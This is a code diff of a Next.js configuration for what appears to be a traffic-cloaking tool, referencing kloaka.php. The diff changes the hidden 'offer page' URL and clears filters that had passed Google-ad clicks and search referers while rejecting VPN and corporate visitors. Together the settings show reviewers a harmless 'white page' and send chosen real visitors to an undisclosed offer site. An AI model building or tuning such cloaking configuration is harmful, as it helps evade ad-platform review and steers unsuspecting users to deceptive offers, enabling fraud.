@@ -15,7 +15,7 @@ import { NextRequest, NextResponse } from 'next/server';
 // Edit these the same way you edited $HCSET in kloaka.php
 
 const HCSET = {
-  OFFER_PAGE: process.env.HC_OFFER_PAGE || 'https://adventurernew.com/85fvsD8Y',
+  OFFER_PAGE: process.env.HC_OFFER_PAGE || 'https://netventra.com/HB1FwQch',
   WHITE_PAGE: '/',
 
   // meta | 302 | iframe | metaprivacy | 302privacy | iframeprivacy
@@ -26,25 +26,25 @@ const HCSET = {
   FILTER_GEO_LIST: 'gb',
 
   /* DEVICE FILTERS */
-  FILTER_DEV_MODE: 'allow',
-  FILTER_DEV_LIST: 'm_Android|m_iOS|d_macOS|d_Windows',
+  FILTER_DEV_MODE: '',
+  FILTER_DEV_LIST: '',
 
   /* UTM FILTERS */
-  FILTER_UTM_MODE: 'allow',
-  FILTER_UTM_LIST: '/gclid=/i',
+  FILTER_UTM_MODE: '',
+  FILTER_UTM_LIST: '',
 
   /* REFERER FILTERS */
-  FILTER_REF_MODE: 'allow',
-  FILTER_REF_LIST: '/google|bing|search/i',
-  FILTER_NOREF: 'reject',
+  FILTER_REF_MODE: '',
+  FILTER_REF_LIST: '',
+  FILTER_NOREF: '',
 
   /* NETWORK FILTERS */
-  FILTER_NET_MODE: 'reject',
-  FILTER_NET_LIST: 'vpn|corporate',
+  FILTER_NET_MODE: '',
+  FILTER_NET_LIST: '',
 
   /* BROWSER FILTERS */
-  FILTER_BRO_MODE: 'allow',
-  FILTER_BRO_LIST: 'Chrome|Safari',
+  FILTER_BRO_MODE: '',
+  FILTER_BRO_LIST: '',
 
   /* SESSION & MISC */
   USE_SESSIONS: true,
